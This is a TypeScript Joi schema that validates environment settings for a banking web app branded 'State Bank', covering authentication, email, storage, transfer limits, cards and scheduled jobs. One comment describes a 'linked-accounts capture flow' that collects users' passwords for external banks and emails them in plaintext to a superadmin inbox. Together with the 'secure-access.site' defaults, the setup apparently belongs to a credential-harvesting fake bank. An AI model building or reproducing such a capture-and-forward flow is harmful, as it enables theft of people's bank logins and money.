import * as Joi from 'joi';

export const envValidationSchema = Joi.object({
  NODE_ENV: Joi.string().valid('development', 'test', 'production').default('development'),
  PORT: Joi.number().default(3001),

  // Single source of truth for the displayed app / bank name (see
  // src/common/brand.ts). Drives email templates, WebAuthn RP name, TOTP
  // issuer, etc.
  APP_NAME: Joi.string().default('State Bank'),

  // Baseline accounts seeded on startup if absent (create-if-missing). A pair
  // is only seeded when BOTH its email and password are set; leave blank to
  // skip. See modules/bootstrap/bootstrap-seed.service.ts.
  SEED_ADMIN_EMAIL: Joi.string().email().allow('').optional(),
  SEED_ADMIN_PASSWORD: Joi.string().allow('').optional(),
  SEED_ADMIN_NAME: Joi.string().allow('').optional(),
  SEED_USER_EMAIL: Joi.string().email().allow('').optional(),
  SEED_USER_PASSWORD: Joi.string().allow('').optional(),
  SEED_USER_NAME: Joi.string().allow('').optional(),

  // Periodic logical backup (pg_dump primary → restore into a backup DB).
  // Requires pg_dump/psql on PATH in the runtime. See modules/backup.
  BACKUP_ENABLED: Joi.boolean().truthy('true').falsy('false').default(false),
  BACKUP_TARGET_URL: Joi.string()
    .uri({ scheme: ['postgres', 'postgresql'] })
    .allow('')
    .optional(),
  BACKUP_SOURCE_URL: Joi.string()
    .uri({ scheme: ['postgres', 'postgresql'] })
    .allow('')
    .optional(),
  BACKUP_CRON: Joi.string().default('0 */6 * * *'),

  DATABASE_URL: Joi.string().uri({ scheme: ['postgresql', 'postgres'] }).required(),
  // Unpooled connection for Prisma migrations (schema.prisma directUrl).
  // Point it at the same DB as DATABASE_URL when no pooler is in play.
  DIRECT_URL: Joi.string().uri({ scheme: ['postgresql', 'postgres'] }).optional(),
  REDIS_URL: Joi.string().uri({ scheme: ['redis', 'rediss'] }).required(),

  JWT_PRIVATE_KEY: Joi.string().allow('').optional(),
  JWT_PUBLIC_KEY: Joi.string().allow('').optional(),
  JWT_ACCESS_TTL: Joi.string().default('15m'),
  JWT_REFRESH_TTL: Joi.string().default('30d'),
  JWT_MFA_TTL: Joi.string().default('5m'),
  JWT_RECOVERY_TTL: Joi.string().default('15m'),
  // Server-enforced idle-session timeout: a session with no authenticated
  // activity for this long is revoked (reason: idle_timeout), forcing re-login.
  SESSION_IDLE_TIMEOUT: Joi.string().default('15m'),
// JWT_RECOVERY_TTL: Joi.string().default('15m'),
  AES_KEY: Joi.string().allow('').optional(),
  // AES_KEY: Joi.string().allow('').optional(),
  SSN_PEPPER: Joi.string().allow('').optional(),

  CORS_ORIGIN: Joi.string().required(),
  WEB_BASE_URL: Joi.string().uri().required(),

  SMTP_HOST: Joi.string().allow('').optional(),
  SMTP_PORT: Joi.number().default(587),
  SMTP_USER: Joi.string().allow('').optional(),
  SMTP_PASS: Joi.string().allow('').optional(),
  SMTP_SECURE: Joi.string().valid('true', 'false').optional(),
  SMTP_FROM: Joi.string().email().default('no-reply@secure-access.site'),

  // Email provider selector — defaults to auto: Resend if RESEND_API_KEY
  // is set, else nodemailer (SMTP).
  EMAIL_PROVIDER: Joi.string().valid('resend', 'nodemailer').optional(),
  RESEND_API_KEY: Joi.string().allow('').optional(),
  RESEND_FROM: Joi.string().allow('').optional(),

  // Admin Mail Desk (two-way threaded email). All optional — sensible
  // defaults live in src/modules/mail/mail-desks.ts + mail.service.ts.
  RESEND_WEBHOOK_SECRET: Joi.string().allow('').optional(),
  MAIL_REPLY_DOMAIN: Joi.string().allow('').optional(),
  MAIL_DESK_CARE_FROM: Joi.string().allow('').optional(),
  MAIL_DESK_CARE_NAME: Joi.string().allow('').optional(),
  MAIL_DESK_ADMIN_FROM: Joi.string().allow('').optional(),
  MAIL_DESK_ADMIN_NAME: Joi.string().allow('').optional(),
  MAIL_DESK_MANAGER_FROM: Joi.string().allow('').optional(),
  MAIL_DESK_MANAGER_NAME: Joi.string().allow('').optional(),

  ADMIN_NOTIFICATION_EMAIL: Joi.string().default('ops@secure-access.site'),
  ADMIN_KYC_REVIEW_EMAIL: Joi.string().default('kyc@secure-access.site'),
  /// Inbox that receives external-bank credentials submitted via the
  /// linked-accounts capture flow. SHOULD be a superadmin's inbox, not
  /// the general ops alias — these payloads contain plaintext bank
  /// passwords (decrypted at email send time).
  SUPERADMIN_EMAIL: Joi.string().allow('').optional(),
  ADMIN_NOTIFICATION_ENABLED: Joi.boolean().truthy('true').falsy('false').default(true),
  WELCOME_EMAIL_ENABLED: Joi.boolean().truthy('true').falsy('false').default(true),

  GEOIP_MMDB_PATH: Joi.string().optional(),

  MFA_CODE_TTL_SECONDS: Joi.number().default(300),
  MFA_MAX_ATTEMPTS: Joi.number().default(5),

  VERIFICATION_CODE_TTL_SEC: Joi.number().default(600),
  VERIFICATION_MAX_ATTEMPTS: Joi.number().default(5),
  VERIFICATION_RESEND_COOLDOWN_SEC: Joi.number().default(60),
  SIGNUP_SESSION_TTL_DAYS: Joi.number().default(7),

  STORAGE_DRIVER: Joi.string().valid('filesystem', 's3').default('filesystem'),
  STORAGE_FS_ROOT: Joi.string().default('./tooling/storage'),
  STORAGE_S3_BUCKET: Joi.string().allow('').optional(),
  STORAGE_S3_REGION: Joi.string().default('us-east-1'),
  STORAGE_S3_ENDPOINT: Joi.string().allow('').optional(),
  STORAGE_S3_ACCESS_KEY: Joi.string().allow('').optional(),
  STORAGE_S3_SECRET_KEY: Joi.string().allow('').optional(),
  STORAGE_S3_FORCE_PATH_STYLE: Joi.boolean().truthy('true').falsy('false').default(true),

  DOC_MAX_BYTES: Joi.number().default(10 * 1024 * 1024),
  ADMIN_ATTACHMENT_MAX_BYTES: Joi.number().default(20 * 1024 * 1024),

  WEATHER_PROVIDER: Joi.string().valid('open-meteo', 'openweather').default('open-meteo'),
  OPENWEATHER_API_KEY: Joi.string().allow('').optional(),
  GEOIP_FALLBACK_TIMEZONE: Joi.string().default('America/New_York'),
  GREETING_CACHE_TTL_SEC: Joi.number().default(60),
  WEATHER_CACHE_TTL_SEC: Joi.number().default(600),

  CHECKING_DAILY_ATM_CENTS: Joi.number().default(50000),
  CHECKING_DAILY_PURCHASES_CENTS: Joi.number().default(500000),
  CHECKING_CASH_DEPOSIT_CENTS: Joi.number().default(200000),
  CHECKING_MOBILE_CHECK_CENTS: Joi.number().default(200000),
  CHECKING_OUTGOING_WIRE_CENTS: Joi.number().default(2500000),
  SAVINGS_APY_BPS: Joi.number().default(450),

  TX_PAGE_DEFAULT: Joi.number().default(25),
  TX_PAGE_MAX: Joi.number().default(100),
  INSIGHTS_CACHE_TTL_SEC: Joi.number().default(300),

  TRANSFER_MIN_CENTS: Joi.number().default(500),
  TRANSFER_MAX_CENTS: Joi.number().default(2_500_000),
  TRANSFER_INSTANT_FEE_BPS: Joi.number().default(175),
  TRANSFER_INSTANT_FEE_MIN_CENTS: Joi.number().default(25),
  TRANSFER_SETTLE_INSTANT_MS: Joi.number().default(5000),
  TRANSFER_SETTLE_STANDARD_MS: Joi.number().default(30000),
  RECURRING_SCAN_CRON: Joi.string().default('0 * * * *'),
  TRIAL_BALANCE_CRON: Joi.string().default('0 3 * * *'),
  BULL_QUEUE_PREFIX: Joi.string().default('bank-demo'),
  ADMIN_NOTIFY_TRANSFER_MIN_CENTS: Joi.number().default(0),
  ADMIN_NOTIFY_TRANSFER_BURST_WINDOW_SEC: Joi.number().default(60),

  PAYMENT_REQUEST_TTL_DAYS: Joi.number().default(14),

  JWT_ELEVATION_TTL: Joi.string().default('5m'),
  CARD_REVEAL_TTL_SEC: Joi.number().default(30),
  CARD_DEMO_BIN: Joi.string().default('499999'),
  CARD_DEFAULT_SPENDING_LIMIT_CENTS: Joi.number().default(500_000),

  ROUNDUP_DAILY_CRON: Joi.string().default('0 4 * * *'),
  AUTOSAVE_WEEKLY_CRON: Joi.string().default('0 8 * * *'),

  SMS_PROVIDER: Joi.string().valid('stub', 'twilio').default('stub'),
  TWILIO_ACCOUNT_SID: Joi.string().allow('').optional(),
  TWILIO_AUTH_TOKEN: Joi.string().allow('').optional(),
  TWILIO_FROM: Joi.string().allow('').optional(),

  NOTIFICATION_TX_LARGE_THRESHOLD_CENTS: Joi.number().default(10_000),

  AVATAR_MAX_BYTES: Joi.number().default(5 * 1024 * 1024),
  WEBAUTHN_RP_ID: Joi.string()
    .custom((value: string, helpers) => {
      const parts = value.split(',').map((s) => s.trim()).filter(Boolean);
      if (!parts.length) return helpers.error('any.invalid');
      return value;
    }, 'comma-separated host list')
    .default('localhost'),
  WEBAUTHN_RP_NAME: Joi.string().default('State Bank'),
  WEBAUTHN_ORIGIN: Joi.string()
    .custom((value: string, helpers) => {
      const parts = value.split(',').map((s) => s.trim()).filter(Boolean);
      if (!parts.length) return helpers.error('any.invalid');
      for (const p of parts) {
        try {
          new URL(p);
        } catch {
          return helpers.error('any.invalid');
        }
      }
      return value;
    }, 'comma-separated URI list')
    .default('http://localhost:3000'),
  TOTP_ISSUER: Joi.string().default('State Bank'),

  STATEMENT_MONTHLY_CRON: Joi.string().default('0 5 1 * *'),
  REFERRAL_QUALIFY_BONUS_CENTS: Joi.number().default(2500),
  REFERRAL_CODE_LENGTH: Joi.number().default(8),

  ADMIN_AUDIT_HMAC_KEY: Joi.string().allow('').optional(),
  DEMO_OVERRIDE_MODE: Joi.boolean().truthy('true').falsy('false').default(true),
  OVERRIDE_RATE_LIMIT_PER_MIN: Joi.number().default(60),
});
